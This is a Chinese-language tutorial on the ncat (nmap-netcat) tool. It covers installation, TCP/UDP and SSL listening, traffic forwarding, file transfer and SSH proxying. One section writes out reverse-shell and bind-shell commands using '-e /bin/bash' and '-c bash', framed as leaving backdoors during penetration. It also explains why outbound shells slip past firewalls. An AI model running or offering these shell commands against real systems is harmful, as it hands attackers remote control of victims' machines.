## nmap-netcat(nc)

nc 是由 C 编写的非常强悍的网络工具，`nc` 主要有 4 个版本，gnu nc （2004 年停止维护，也叫 nc traditional）， openbsd nc（重写了 gnu nc，在正常维护），nmap-netcat（也叫 ncat，由 nmap 重写 nc traditional，被称为 21 世纪的 netcat，也是功能最多的 nc）。

下面我介绍的就是 nmap-netcat，出现的不论是 `nc` 还是 `ncat` 请一律当 `ncat` 处理，因为部分在 CentOS 上执行，CentOS上的 `nc` 就是 `ncat`。

## 安装

https://nmap.org/download ，ncat 集成在 nmap 中，可以通过安装 nmap 获取 ncat 。

### Centos / RedHat

```zsh
yum install nc
```

名字就是 nc，但是安装的时候能看到安装的是 nmap-netcat。

### Archlinux

```zsh
sudo pacman -S nmap
```

archlinux 通过装 nmap 会附带上 ncat（即 nc）。

## 功能介绍

### 端口扫描

`ncat` 没有端口扫描（但是 openbsd nc 有），谁让它是由 nmap.org 重写的呢，`nmap` 本身就可以说是命令行工具中的端口扫描这块做的最好的，所以集成在 `nmap` 中的 `ncat` 没有必要还带端口扫描功能，端口扫描直接用 nmap。

### TCP/UDP 通信

```zsh
# -l 表示监听，-p 指定端口，-v 表示会输出详细信息(-vv, -vvv 可以更详细)
# 默认是监听 tcp 。
ncat -lvp 1589
```

```zsh
# 唯一跟上面不同的就是这次监听的是 udp 。
ncat -lvup 1589
```

可以按 [mkcert](https://m4n5ter.github.io/linux/mkcert/mkcert.html) 生成自签证书。

```zsh
# 使用 ssl 来加密通信（否则是明文的，统一网络的人可以轻松嗅探到传输内容）
# --ssl-key，--ssl-cert 可以手动指定证书，--ssl 是生成并使用一个临时证书
ncat --ssl -lvp 1589
```

```zsh
# 如果监听端使用了 --ssl 那么客户端也需要。
 ncat --ssl -nv <IP Address> 1589
```

成功建立通信后可以直接在命令行输入字符来进行通信，会像聊天一样。

### 流量转发

流量转发可以用很多姿势，这里我用一个比较容易理解的姿势：

```zsh
# 目标机器
nc -lvvp 1665
# 中间负责转发的机器。-c 表示连接后直接用 sh 执行 -c 的内容。
# 这里是表示连接到达中间服务器后，中间服务器再连接目标服务器，从而实现流量转发
nc -lvvp 1589 -c 'nc -nv <目标机器 IP> <端口>'
# 客户端
nc -nv <中间机器 IP> <中间机器端口>
```

这样操作后，当客户端执行时，流量走向为：

```
客户端 -> 中间机器 IP:PORT -> 目标机器 IP:PORT
```

### 发送文件

既然都能通信了，那么发文件也是理所应当的，传文件本质也是流量传输。

```zsh
# 提供文件的机器，这样表示建立连接后把 temp.txt 的内容发送过去
nc -lvvp 1665 < temp.txt
# 需要获取文件的机器，这样与目标建立连接后，把它发过来的内容重定向到一个文件中
nc -nv <IP> <PORT> > out.txt
```

方向换一下也是同理：

```zsh
# 接收文件的机器
nc -lvvp 1665 > out.txt
# 发送文件的机器
nc -nv <IP> <PORT> < temp.txt
```

### 反弹 Shell

这个一般用于渗透时留后门，主要是利用 `nc` 的 `-c` 和 `-e` 。

```zsh
# 让客户端发送自己的 shell 给 <IP> <PORT>
# 客户端，这样 <IP> <PORT> 被监听时就会拿到客户端的 shell
# 后续 <IP> <PORT> 要再转发还是什么都可以自由操作
nc -nv <IP> <PORT> -e /bin/bash
-or
nc -nv <IP> <PORT> -c bash
```

```zsh
# 客户端开启一个端口，在这个端口上直接暴露自己的 shell
nc -lp 6666 -e /bin/bash
```

如果用于渗透，受害者一般是内网环境，所以都是用的第一种，主动发送 shell 给攻击者。第二种需要攻击者能访问到受害者的 ip:port 才行。加上一般都有防火墙阻拦，受害者的入站流量可能会被防火墙拦截，但是防火墙一般不会对出站流量有限制，这也是第一种方式的用的比较多的原因。

如果攻击者没有能让受害者访问到的 IP，一般通过内网穿透即可解决。

### SSH 代理

~/.ssh/config

```zsh
Host github.com
  ProxyCommand ncat --proxy 127.0.0.1:10808 --proxy-type <Your proxy type>  %h %p
```

这样对 github 仓库进行 `git pull` `git push` 这样的操作都会走代理。

  `--proxy` 和 `--proxy-type` 可以让 `ncat` 摇身一变为一个代理工具。

### `--allow` / `--allowfile`

限制可以连接到 `ncat`（`nc`） 的 hosts，可以指定一些 IP，来做到只允许指定目标连接。

### `--deny` / `--denyfile`

与上面的相反，它是拒绝。

## 更多功能请自行探索

`ncat` 提供了许多功能，这些功能可以相互组合，或者配合其它东西来使用，能玩出的花样是非常多的。
